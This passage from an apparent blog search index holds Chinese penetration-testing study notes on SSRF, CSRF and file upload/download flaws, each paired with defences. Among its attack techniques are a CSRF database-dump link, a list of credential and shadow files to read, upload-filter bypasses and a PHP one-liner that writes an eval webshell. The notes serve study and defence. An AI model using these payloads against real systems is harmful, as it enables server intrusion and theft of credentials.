href="http://www.oldboyedu.com@192.168.0.1/">httP://www.oldboyedu.com@192.168.0.1/</a></p><p>不正确的正则匹配：http之后到com之前</p></li><li><p>利用协议</p></li></ol><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>（黑名单）</p><p>（1）过滤10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址</p><p>（2）过滤file:///、dict://、gopher://、ftp:// 危险schema</p><p>（3）对返回的内容进行识别</p><p>（4）内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站请求伪造</title>
      <link href="2020/09/12/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>2020/09/12/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.png"></p><h2 id="1、用自己的语言描述csrf攻击原理"><a href="#1、用自己的语言描述csrf攻击原理" class="headerlink" title="1、用自己的语言描述csrf攻击原理"></a>1、用自己的语言描述csrf攻击原理</h2><p>当用户登录某个网站时，产生会话，然后去点击带有csrf攻击程序的web，CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。</p><h2 id="2、csrf攻击分类"><a href="#2、csrf攻击分类" class="headerlink" title="2、csrf攻击分类"></a>2、csrf攻击分类</h2><p><strong>CSRF漏洞一般分为站外和站内两种类型。</strong></p><p><strong>CSRF站外类型</strong>的漏洞本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。</p><p> <strong>CSRF站内类型</strong>的漏洞在一定程度上是由于程序员滥用<code>$_REQUEST</code>类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起这些请求。</p><h2 id="3、csrf漏洞检测方法。"><a href="#3、csrf漏洞检测方法。" class="headerlink" title="3、csrf漏洞检测方法。"></a>3、csrf漏洞检测方法。</h2><p>1、抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</p><p>2、扫描器扫描，但误报较高，后台登录，修改密码等可能扫不出csrf漏洞</p><h2 id="4、完成csrf脱库、添加帐号、更新密码实验"><a href="#4、完成csrf脱库、添加帐号、更新密码实验" class="headerlink" title="4、完成csrf脱库、添加帐号、更新密码实验"></a>4、完成csrf脱库、添加帐号、更新密码实验</h2><p><strong>Csrf脱库</strong>：一般xiaz开源代码去观看路径一般不会改变；一级目录可以在url中看到</p><p>在搭建好的DZ注册普通，然后发帖，插入远程图片，URL为：</p><p><code>http://192.168.0.106:8080/dzcrst/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa</code></p><p>此链接为数据库备份操作</p><p>然后管理员点进去便会执行可以写一些吸引管理员的文字</p><p><img src="/image/csrf/1.jpg"></p><p><img src="/image/csrf/2.jpg" alt="2"></p><p>此时，我们可以访问默认备份路径及我们重命名的文件夹和文件名：<a href="http://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql">http://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql</a></p><p><img src="/image/csrf/3.jpg"></p><p><strong>添加帐号：</strong></p><p><img src="/image/csrf/4.jpg"></p><p><img src="/image/csrf/5.jpg" alt="5"></p><p><strong>修改密码：</strong></p><p>当我们登录DVWA后，在CSRF中：</p><p>LOW级别时：直接修改密码即可。</p><p>medium级别时：Referer得为网站修改页面的路径。否则会修改失败</p><h2 id="5、csrf防范方法"><a href="#5、csrf防范方法" class="headerlink" title="5、csrf防范方法"></a>5、csrf防范方法</h2><p>目前业界服务器端防御CSRF攻击主要有5种策略：</p><p>1验证HTTP Referer字段（可以突破）</p><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。</p><p>2、在请求地址中添加token并验证</p><p>在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p><p>3、在HTTP头中自定义属性并验证</p><p>自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。</p><p>4、在服务端区严格区分好POST与GET的数据请求</p><p>如在asp中不要使用Request来直接获取数据。同时建议不要用GET请求来执行持久性操作，如：<a href="https://links.jianshu.com/go?to=http://www.yeeyan.com/space/deleteEvent/16824">http://www.yeeyan.com/space/deleteEvent/16824</a>。</p><p>5、使用验证码或者密码确认方式进行</p><p>6、用户端防御</p><p>用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害</p><p>7、安全设备防御</p><p>用户可以借助第三方的专业安</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传、下载</title>
      <link href="2020/09/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/"/>
      <url>2020/09/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD.png"></p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h3><p>  一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p><h3 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h3><h4 id="一般链接形式"><a href="#一般链接形式" class="headerlink" title="一般链接形式:"></a>一般链接形式:</h4><p>download.php?path=<br>down.php?file=<br>data.php?file=</p><h4 id="或者包含参数"><a href="#或者包含参数" class="headerlink" title="或者包含参数:"></a>或者包含参数:</h4><p>&amp;Src=<br>&amp;Inputfile=<br>&amp;Filepath=<br>&amp;Path=<br>&amp;Data=</p><h3 id="三、利用思路"><a href="#三、利用思路" class="headerlink" title="三、利用思路:"></a>三、利用思路:</h3><p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p><p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p><p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>      尝试读取/root/.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用../来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p><h5 id="如果我们遇到的是java-oracle环境"><a href="#如果我们遇到的是java-oracle环境" class="headerlink" title="如果我们遇到的是java+oracle环境"></a>如果我们遇到的是java+oracle环境</h5><p>  可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p><h5 id="如果具有root权限"><a href="#如果具有root权限" class="headerlink" title="如果具有root权限"></a>如果具有root权限</h5><p>  在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。</p><p>locate 读取方法: locate mlocate.db admin    //可以将mlocate.db中包含admin文件名的内容全部输出来</p><p>（4）常见利用文件<br>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>/root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥<br>/etc/passwd<br>/etc/shadow<br>/etc/my.cnf //mysql配置文件<br>/etc/httpd/conf/httpd.conf //apache配置文件<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p><h3 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h3><p>（1）过滤”.”，使用户在url中不能回溯上级目录</p><p>（2）正则严格判断用户输入参数的格式</p><p>（3）php.ini配置open_basedir限定文件访问范围</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/1.jpg"></p><h3 id="一、客户端检测绕过-javascript-检测"><a href="#一、客户端检测绕过-javascript-检测" class="headerlink" title="一、客户端检测绕过(javascript 检测)"></a>一、客户端检测绕过(javascript 检测)</h3><p>​      首先观察到提示只允许上传图片文件，那么前端的查看代码，当页面发生改变时，会调用这个checkFileExt函数来检查上传的是不是图片，我们只需要在前端将checkFileExt函数删除，就能上传一个一个非图片文件。</p><p><strong>文件上传客户端：</strong></p><p>将checkFileExt(this.value)函数删除便可上传任意文件</p><p>或者通过burp抓包将之前改为符合类型的文件在改回来</p><h3 id="二、服务端验证绕过-MIME-类型检测"><a href="#二、服务端验证绕过-MIME-类型检测" class="headerlink" title="二、服务端验证绕过(MIME 类型检测)"></a>二、服务端验证绕过(MIME 类型检测)</h3><p>​      MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p>​      每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p><p><strong>常见的MIME类型(通用型)：</strong></p><ul><li>超文本标记语言文本 .html text/html</li><li>xml文档 .xml text/xml</li><li>XHTML文档 .xhtml application/xhtml+xml</li><li>普通文本 .txt text/plain</li><li>RTF文本 .rtf application/rtf</li><li>PDF文档 .pdf application/pdf</li><li>Microsoft Word文件 .word application/msword</li><li>PNG图像 .png image/png</li><li>GIF图形 .gif image/gif</li><li>JPEG图形 .jpeg,.jpg image/jpeg</li><li>au声音文件 .au audio/basic</li><li>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</li><li>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</li><li>MPEG文件 .mpg,.mpeg video/mpeg</li><li>AVI文件 .avi video/x-msvideo</li><li>GZIP文件 .gz application/x-gzip</li><li>TAR文件 .tar application/x-tar</li><li>任意的二进制数据 application/octet-stream</li></ul><p><strong>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</strong></p><p>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p><p><code>$_FILES[&quot;file&quot;][&quot;name&quot;] </code> 被上传文件的名称</p><p><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code> 被上传文件的类型</p><p><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code> 被上传文件的大小，以字节计</p><p><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code> 存储在服务器的文件的临时副本的名称</p><p><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> 由文件上传导致的错误代码</p><p>详细可参考：<a href="http://www.w3school.com.cn/php/php_file_upload.asp">http://www.w3school.com.cn/php/php_file_upload.asp</a></p><p>​       分析代码逻辑：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查。</p><p>分析upload_sick函数（定义在uploadfunction.php文件里面）存在漏洞的的原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。</p><p>​     上传一张正常的符合标准的图片，对其content-type进行抓包操作。可见正常上传符合要求的图片中数据包中content-type为image/png对比符合条件，而php文件则不符合条件返回文件类型错误。</p><h3 id="三、代码注入绕过–getimagesize"><a href="#三、代码注入绕过–getimagesize" class="headerlink" title="三、代码注入绕过–getimagesize()"></a>三、代码注入绕过–getimagesize()</h3><p>​    getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息，如果用这个涵数来获取类型，从而判断是否是图片的话，会存在问题。</p><p>语法格式：</p><p>  <code> array getimagesize ( string $filename [, array &amp;$imageinfo ] )</code></p><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p><p><strong>文件包含漏洞之文件上传漏洞利用</strong></p><p>方法一：直接伪造头部GIF89A</p><p>方法二：CMD方法，copy /b test.png+1.php muma.png</p><p>方法三：直接使用工具增加备注写入一句话木马。</p><h3 id="四、路径-扩展名绕过"><a href="#四、路径-扩展名绕过" class="headerlink" title="四、路径/扩展名绕过"></a>四、路径/扩展名绕过</h3><p>1、白名单</p><p>0x00截断或test.asp%00.jpg</p><p>MIME绕过</p><p>2、黑名单</p><p>（1）文件名大小写绕过</p><p>（2）名单绕过</p><p>​     用黑名单里没有的名单进行攻击，比如黑名单里没有.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件之类</p><p>（3）特殊文件名或文件夹绕过(windows)</p><p>​      还有比如发送的http 包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。</p><p>（4）0x00截断%00和0x0a</p><p>name = getname(http request) //假如这时候获取到的文件名是test.asp .jpg(asp 后面为0x00)</p><p>type = gettype(name) //而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</p><p>if (type == jpg)</p><p>SaveFileToPath(UploadPath.name, name) //但在这里却是以0x00 作为文件名截断</p><p>​                                   //最后以test.asp 存入路径里</p><p>（5）把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。</p><p>（6）双后缀名绕过</p><p>（7）::$DATA绕过</p><p>​    是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p><h3 id="五、中间件解析漏洞绕过"><a href="#五、中间件解析漏洞绕过" class="headerlink" title="五、中间件解析漏洞绕过"></a>五、中间件解析漏洞绕过</h3><h4 id="总结图-1"><a href="#总结图-1" class="headerlink" title="总结图"></a>总结图</h4><p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/2.jpg"></p><h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><h5 id="（一）IIS5-x-6-x解析漏洞"><a href="#（一）IIS5-x-6-x解析漏洞" class="headerlink" title="（一）IIS5.x-6.x解析漏洞"></a><strong>（一）IIS5.x-6.x解析漏洞</strong></h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><p><strong>目录解析(6.0)</strong></p><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p><p><strong>文件解析</strong></p><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><p><strong>解析文件类型</strong></p><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p><p>/test.asa<br>/test.cer<br>/test.cdx</p><p><strong>修复方案</strong></p><p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p><h4 id="（二）IIS7-x解析漏洞"><a href="#（二）IIS7-x解析漏洞" class="headerlink" title="（二）IIS7.x解析漏洞"></a>（二）IIS7.x解析漏洞</h4><p>需要把请求限制的 对勾 给去掉，才会有解析漏洞<br>192.168.0.106:8089/1.jpg/.php,这样去构造。</p><p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/3.jpg"></p><hr><h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p><strong>漏洞原理</strong></p><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。</p><p><strong>漏洞形式</strong></p><p><a href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p><p><strong>其余配置问题导致漏洞</strong></p><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p><p><strong>修复方案</strong></p><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure><p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) &#x2F;index.php</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line">    配置文件LoadModule rewrite_module modules&#x2F;mod_rewrite.so前的注释去掉，寻找关键词：AllowOverride，并把后面的参数从None全部改成All</span><br></pre></td></tr></table></figure><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p><strong>漏洞原理</strong></p><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA%E2%80%9Cphpinfo.jpg/1.php%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9E%84%E9%80%A0%E6%88%90SCRIPT_FILENAME%E4%BC%A0%E9%80%92%E7%BB%99PHP">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p><p><strong>漏洞形式</strong></p><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p><p>xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</p><p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p><p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p><p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p><p><strong>修复方案</strong></p><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..&#x2F;.php ) &#123;</span><br><span class="line"></span><br><span class="line">return 403;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p><hr><h4 id="htaccess文件解析"><a href="#htaccess文件解析" class="headerlink" title=".htaccess文件解析"></a>.htaccess文件解析</h4><p>上传.htaccess文件 ，是将本文件夹中的所有文件用php来执行  也可以称为文件包含漏洞<br>文件内容为：</p><blockquote><p>&lt;FilesMatch “”&gt;SetHandler application/x-httpd-php</FilesMatch></p></blockquote><h4 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="本地文件包含解析"></a>本地文件包含解析</h4><p>文件包含漏洞的查找，当有源代码的时候可以直接查找，相关函数，当没有源代码的时候我们就需要手工包含别的文件来看看是否有包含漏洞。</p><p>文件包含有四个函数，遇到错误不会停止执行：include()、include_once()<br>                                    遇到错误会停止执行：require()、ruquire_once()<br>                                    我们一般使用include()和include_once()</p><p>需要我们把allow_url_include()设置为on状态、magic_quotes_gpc为off状态</p><p>（1）包含漏洞一般采用图片与文件一起上传，利用包含漏洞将图片中的一句话木马给解出来。<br>（2）需要使用../来进行返回上一级目录，如果被过滤可以进行…/./进行过滤。<br>（3）如果没有发现需要进行上传的漏洞，我们可以选择选择找到日志文件进行包含获取webshell，/apache/logs/access.log目录，但是目录前面的../需要自己构造。<br>（4）文件包含读文件和写文件，这个都需要使用php协议<br>读文件：php://filter/read=convert.base64-encode/resource=     （使用base64加密防止报错）<br>写文件：php://input   在post中提交<?php system('net user')?><br>（5）str_replace()函数，可以将http、https、../、..\都替换为空或删除。<br>我们需要使用ht<a href="http://tp//%E5%92%8C.../%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BC%9A%E5%8F%97%E5%BD%B1%E5%93%8D%E3%80%82">http://tp://和..././进行绕过，绝对路径也可以不会受影响。</a><br>（6）fnmatch()函数，只允许include和file头进行访问<br>我们可以使用file协议file://c:1.txt 这里绝对路径和../都支持。一般企业都使用这个函数进行过滤。</p><h3 id="六、安全防范"><a href="#六、安全防范" class="headerlink" title="六、安全防范"></a>六、安全防范</h3><p>​      针对文件上传漏洞的特点和必须具备的三个条件，我们阻断任何一个条件就可以达到组织文件上传攻击的目的：</p><p>1、最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性；</p><p>2、文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传）；此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码；</p><p>3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件；</p><p>4、单独设置文件服务器的域名；</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击</title>
      <link href="2020/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>2020/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
